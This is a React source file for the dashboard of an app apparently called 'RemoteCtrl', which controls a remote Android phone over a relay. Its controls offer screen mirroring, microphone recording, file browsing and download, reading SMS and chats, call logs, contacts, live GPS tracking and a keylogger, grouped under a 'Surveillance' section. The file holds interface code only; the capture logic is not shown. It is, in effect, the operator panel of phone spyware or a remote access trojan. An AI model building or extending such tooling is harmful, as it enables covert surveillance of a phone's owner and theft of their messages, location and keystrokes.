import { useState } from 'react'
import ActivityModal from './ActivityModal'

const NAV = [
  { key: 'overview',     icon: '🏠', label: 'Overview' },
  { key: 'screen',       icon: '🖥️', label: 'Screen' },
  { key: 'files',        icon: '📂', label: 'Files' },
  { key: 'surveillance', icon: '🔍', label: 'Surveillance', badge: 'PRO' },
  { key: 'comms',        icon: '💬', label: 'Communications' },
  { key: 'location',     icon: '📍', label: 'Location' },
  { key: 'system',       icon: '⚙️', label: 'System' },
]

const CONTROLS = [
  { key: 'mirrorScreen',  icon: '🖥️',  label: 'Mirror Screen',   desc: 'Live display stream',       nav: 'screen'       },
  { key: 'getScreen',     icon: '📸',  label: 'Screenshot',       desc: 'Capture current frame',     nav: 'screen'       },
  { key: 'captureAudio',  icon: '🎙️', label: 'Mic Capture',      desc: 'Record microphone',         nav: 'surveillance' },
  { key: 'captureFiles',  icon: '📂',  label: 'File Browser',     desc: 'Browse remote FS',          nav: 'files'        },
  { key: 'downloadFiles', icon: '⬇️', label: 'Download Files',   desc: 'Pull files to local',       nav: 'files'        },
  { key: 'callLogs',      icon: '📞',  label: 'Call Logs',        desc: 'View call history',         nav: 'comms'        },
  { key: 'messages',      icon: '💬',  label: 'Messages',         desc: 'Read SMS & chats',          nav: 'comms'        },
  { key: 'location',      icon: '📍',  label: 'Live Location',    desc: 'Track GPS position',        nav: 'location'     },
  { key: 'contacts',      icon: '👥',  label: 'Contacts',         desc: 'Address book access',       nav: 'comms'        },
  { key: 'keylogger',     icon: '⌨️', label: 'Keylogger',        desc: 'Capture keystrokes',        nav: 'surveillance', danger: true },
]

export default function Dashboard({ device, onDisconnect }) {
  const [page,  setPage]  = useState('overview')
  const [modal, setModal] = useState(null)

  const items = page === 'overview'
    ? CONTROLS
    : CONTROLS.filter(c => c.nav === page)

  const pageLabel = NAV.find(n => n.key === page)?.label ?? 'Overview'

  return (
    <div className="dashboard">
      {/* ── Topbar ── */}
      <div className="topbar">
        <div className="logo" style={{ fontSize: '1rem' }}>
          <div className="logo-icon" style={{ width: 32, height: 32, fontSize: '1rem' }}>📡</div>
          Remote<span>Ctrl</span>
        </div>
        <div className="device-info">
          <span className="status-dot" />
          <span>{device.host}:{device.port}</span>
          <span>·</span>
          <span>Samsung Galaxy S23</span>
          <span>·</span>
          <span>Android 14</span>
        </div>
        <button className="btn-disconnect" onClick={onDisconnect}>Disconnect</button>
      </div>

      <div className="main-area">
        {/* ── Sidebar ── */}
        <nav className="sidebar">
          <div className="sidebar-section">Navigation</div>
          {NAV.map(n => (
            <div
              key={n.key}
              className={`nav-item${page === n.key ? ' active' : ''}`}
              onClick={() => setPage(n.key)}
            >
              <span className="icon">{n.icon}</span>
              {n.label}
              {n.badge && <span className="nav-badge">{n.badge}</span>}
            </div>
          ))}
        </nav>

        {/* ── Content ── */}
        <div className="content">
          {page === 'overview' && (
            <>
              <div>
                <div className="page-title">Device Overview</div>
                <div className="page-sub">Samsung Galaxy S23 · Connected via relay</div>
              </div>
              <div className="stats-row">
                <div className="stat-card">
                  <div className="stat-label">Battery</div>
                  <div className="stat-value green">78%</div>
                </div>
                <div className="stat-card">
                  <div className="stat-label">Network</div>
                  <div className="stat-value accent">LTE</div>
                </div>
                <div className="stat-card">
                  <div className="stat-label">Storage</div>
                  <div className="stat-value orange">64 GB</div>
                </div>
                <div className="stat-card">
                  <div className="stat-label">Uptime</div>
                  <div className="stat-value">3d 14h</div>
                </div>
              </div>
            </>
          )}

          <div>
            <div className="page-title">
              {page === 'overview' ? '⚡ Quick Actions' : pageLabel}
            </div>
            <div className="page-sub" style={{ marginBottom: '1rem' }}>
              Tap any action to begin
            </div>
            <div className="controls-grid">
              {items.map(item => (
                <div
                  key={item.key}
                  className={`control-btn${item.danger ? ' danger' : ''}`}
                  onClick={() => setModal(item.key)}
                >
                  <span className="cb-icon">{item.icon}</span>
                  <span className="cb-label">{item.label}</span>
                  <span className="cb-desc">{item.desc}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {modal && (
        <ActivityModal featureKey={modal} onClose={() => setModal(null)} />
      )}
    </div>
  )
}
